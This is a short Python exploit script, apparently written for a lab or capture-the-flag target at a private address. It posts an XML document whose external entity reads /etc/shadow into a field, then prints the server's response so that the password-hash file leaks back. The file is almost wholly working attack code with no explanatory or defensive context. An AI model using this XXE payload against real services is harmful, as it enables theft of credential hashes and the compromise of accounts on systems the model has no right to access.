#!/usr/bin/env python3

import requests
import sys
import json
from pprint import pprint

xml = '''<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE person [<!ENTITY file SYSTEM "file:///etc/shadow" >]><person><firstname>lol2</firstname><lastname>&file;</lastname></person>'''
r = requests.post("http://10.13.37.5", data={'data' : xml})
print("Headers: ", r.headers)
print("Status code: ", r.status_code)
print("Encoding: ", r.encoding)
print("Text: ", r.text)
print("Json: ", json.dumps(r.json(), indent=4))
